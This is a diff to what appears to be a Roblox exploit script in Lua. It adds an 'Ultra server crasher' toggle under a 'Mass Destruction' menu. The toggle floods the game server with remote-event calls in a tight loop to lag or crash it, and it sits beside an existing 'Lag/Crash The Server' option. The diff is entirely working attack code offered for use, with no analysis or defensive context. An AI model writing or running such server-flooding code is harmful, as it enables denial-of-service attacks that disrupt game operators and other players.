@@ -421,6 +421,28 @@ else
   	local Section = Tab:AddSection({
 		Name = "Mass Destruction"
 	})
+	
+	    	Tab:AddToggle({
+		Name = "Ultra server crasher",
+		Default = false,
+		Callback = function(Value)
+			while Value == true do 
+				for i = 1, 10 do
+					for i = 1, 4 do
+						Events:WaitForChild("OutsideFood"):FireServer(6, {
+							["item2"] = "Pizza",
+							["placement"] = i
+						})
+						Events:WaitForChild("OutsideFood"):FireServer(6, {
+							["item2"] = "BloxyPack",
+							["placement"] = i
+						})
+					end
+				end
+				task.wait(.000001)
+			end
+		end    
+	})
 
     	Tab:AddToggle({
 		Name = "Lag/Crash The Server",
